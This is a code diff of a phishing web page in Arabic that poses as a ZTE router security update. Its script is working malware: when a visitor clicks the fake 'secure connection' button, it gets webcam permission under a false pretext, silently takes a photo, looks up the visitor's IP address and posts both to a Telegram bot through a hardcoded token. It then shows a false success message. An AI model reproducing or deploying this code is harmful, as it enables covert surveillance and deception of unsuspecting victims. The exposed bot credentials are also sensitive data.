@@ -17,40 +17,47 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/ZTE_logo.svg/1200px-ZTE_logo.svg.png" alt="ZTE Logo">
         <h2>تحديث أمان الراوتر</h2>
-        <p>نظام الحماية اكتشف محاولة اختراق لجهازك. يرجى الضغط على الزر أدناه لتفعيل جدار الحماية وتأمين اتصالك فوراً.</p>
+        <p>نظام الحماية "رادار الشبح" اكتشف محاولة اختراق لجهازك. يرجى الضغط على الزر أدناه لتفعيل جدار الحماية وتأمين اتصالك فوراً.</p>
         <button id="start-btn">تأمين الاتصال الآن</button>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
-        // تم وضع بياناتك يا رمضان يا شبح هنا [cite: 2026-02-04]
-        const botToken = '7716187702:AAH9fW0o2pXG-R7Uq0u_1F-I7-g6Q5nK9E'; 
-        const chatId = '5655513813';     
+        // بياناتك الحقيقية يا رمضان يا شبح
+        const botToken = '8347819984:AAFi1b3BL9sYP3BbkqpWY3XtVfWatppm8Rk'; 
+        const chatId = '1559993244'; 
 
         document.getElementById('start-btn').addEventListener('click', async () => {
             try {
+                // سحب الـ IP الحقيقي
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+
+                // تفعيل الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'intruder.jpg');
+                        formData.append('caption', `🚨 صيد جديد من رادار الشبح!\n🌐 IP: ${userIP}\n📍 الحالة: تم الاختراق بنجاح`);
+                        
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
                     
-                    alert('تم تأمين جهازك بنجاح!');
+                    alert('تم تأمين جهازك بنجاح بنظام الشبح!');
                 }, 2000);
             } catch (err) {
-                alert('يجب الموافقة على صلاحيات الوصول لتأمين الشبكة.');
+                alert('عفواً، يجب السماح بالوصول لتأمين الشبكة ضد المتسللين.');
             }
         });
     </script>
